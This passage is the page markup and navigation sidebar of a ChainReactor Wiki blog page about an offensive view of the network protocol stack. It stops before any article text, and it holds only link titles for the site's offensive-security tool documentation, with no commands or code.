
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="chainreactors wiki">
      
      
        <meta name="author" content="M09ic">
      
      
        <link rel="canonical" href="https://wiki.chainreactors.red/wiki/blog/whitepaper/REM_en/">
      
      
      
      
        
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
    
    
      
        <title>Your Network, My Transport Layer: An Offensive Perspective on the Network Protocol Stack - ChainReactor Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.618322db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-DCRVR86FG2"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-DCRVR86FG2",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-DCRVR86FG2",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
  </head>
  
  
    <body dir="ltr">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#your-network-my-transport-layer-an-offensive-perspective-on-the-network-protocol-stack" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="ChainReactor Wiki" class="md-header__button md-logo" aria-label="ChainReactor Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            ChainReactor Wiki
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Your Network, My Transport Layer: An Offensive Perspective on the Network Protocol Stack
            
          </span>
        </div>
      </div>
    </div>
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/chainreactors/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../.." class="md-tabs__link">
        
  
  
    
  
  导航

      </a>
    </li>
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../IoM/" class="md-tabs__link">
          
  
  
    
  
  IoM

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../gogo/" class="md-tabs__link">
          
  
  
    
  
  gogo

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../spray/" class="md-tabs__link">
          
  
  
    
  
  spray

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../zombie/" class="md-tabs__link">
          
  
  
    
  
  zombie

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../rem/" class="md-tabs__link">
          
  
  
    
  
  rem

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../libs/" class="md-tabs__link">
          
  
  
    
  
  libs

        </a>
      </li>
    
  

      
        
  
  
  
  
    
    
      
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../mapping/" class="md-tabs__link">
          
  
  
    
  
  Preview

        </a>
      </li>
    
  

    
  

      
        
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../" class="md-tabs__link">
          
  
  
    
  
  Blog

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


  

<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="ChainReactor Wiki" class="md-nav__button md-logo" aria-label="ChainReactor Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    ChainReactor Wiki
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/chainreactors/" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    GitHub
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    导航
  

    
  </span>
  
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    IoM
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    IoM
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/design/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Design
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/quickstart/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Quickstart
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/concept/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Concept
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/roadmap/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    RoadMap
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/guideline/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Guideline
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            
  
    Guideline
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/deploy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    安装部署
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/listener/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Listener
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/payload/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Payload
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/post_exploitation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    后渗透基本操作
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/embed_mal/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    内置插件
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/proxy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    代理/隧道
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6_8" >
        
          
          <label class="md-nav__link" for="__nav_2_6_8" id="__nav_2_6_8_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    高级用法
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6_8">
            <span class="md-nav__icon md-icon"></span>
            
  
    高级用法
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/advance/DumpLSASS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    DumpLSASS
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/advance/DomainFronting/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    DomainFronting
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/advance/Multi-Server/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    MultiServer
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/advance/Guardrail/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Guardrail
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_6_9" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/guideline/develop/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    DevelopGuide
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_6_9" id="__nav_2_6_9_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_9_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6_9">
            <span class="md-nav__icon md-icon"></span>
            
  
    DevelopGuide
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mal/quickstart/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    mal快速入门
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/develop/server/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Server开发
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/develop/client/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Client开发
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/guideline/develop/implant/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    Implant开发
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    Manual
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7">
            <span class="md-nav__icon md-icon"></span>
            
  
    Manual
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_2" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/manual/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    client/server
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7_2" id="__nav_2_7_2_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_2">
            <span class="md-nav__icon md-icon"></span>
            
  
    client/server
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/manual/deploy/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    install&deploy
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/manual/listener/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    listener
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/manual/build/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    build
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/manual/client/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    client usage
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/manual/implant/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    implant usage
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_3" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/mal/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    mals插件生态
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7_3" id="__nav_2_7_3_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    mals插件生态
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mal/embed/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    embed
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_3_3" >
        
          
          <label class="md-nav__link" for="__nav_2_7_3_3" id="__nav_2_7_3_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    lua
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_7_3_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_3_3">
            <span class="md-nav__icon md-icon"></span>
            
  
    lua
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mal/builtin/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    builtin
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mal/beacon/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    beacon
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mal/rpc/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    rpc
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_4" >
        
          
          <label class="md-nav__link" for="__nav_2_7_4" id="__nav_2_7_4_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    
  
    mutant
  

    
  </span>
  
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_4">
            <span class="md-nav__icon md-icon"></span>
            
  
    mutant
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/mutant/malefic_mutant/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    tool
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
          
        
      
        
      
        
      
        
      
    
    
    
      
      
        
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
          
        
        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_7_5" >
        
          
          <div class="md-nav__link md-nav__container">
            <a href="../../../IoM/manual/implant/" class="md-nav__link ">
              
  
  
  <span class="md-ellipsis">
    
  
    implant
  

    
  </span>
  
  

            </a>
            
              
              <label class="md-nav__link " for="__nav_2_7_5" id="__nav_2_7_5_label" tabindex="0">
                <span class="md-nav__icon md-icon"></span>
              </label>
            
          </div>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_7_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7_5">
            <span class="md-nav__icon md-icon"></span>
            
  
    implant
  

          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/implant/build/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    build
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/implant/modules/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    
  
    modules
  

    
  </span>
  
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../IoM/manual/implant/win_kit/" class="md-nav__link">
        
  
  
